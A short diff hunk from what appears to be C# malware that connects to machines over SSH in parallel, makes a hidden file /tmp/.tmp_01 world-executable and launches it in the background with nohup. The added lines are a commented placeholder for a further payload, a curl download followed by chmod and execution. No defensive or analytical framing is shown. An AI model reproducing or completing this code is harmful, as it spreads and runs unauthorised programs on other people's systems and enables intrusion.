@@ -147,6 +147,9 @@ Parallel.ForEach<ushort>(SshPorts, port =>
                     ssh.Connect();
                     ssh.RunCommand("chmod aug+xwr /tmp/.tmp_01 &");
                     ssh.RunCommand("nohup /tmp/.tmp_01 &");
+
+                    // Place payload here:
+                    // ssh.RunCommand("curl ... -O out && chmod +x out && ./out");
                     
                     ssh.Disconnect();
                     
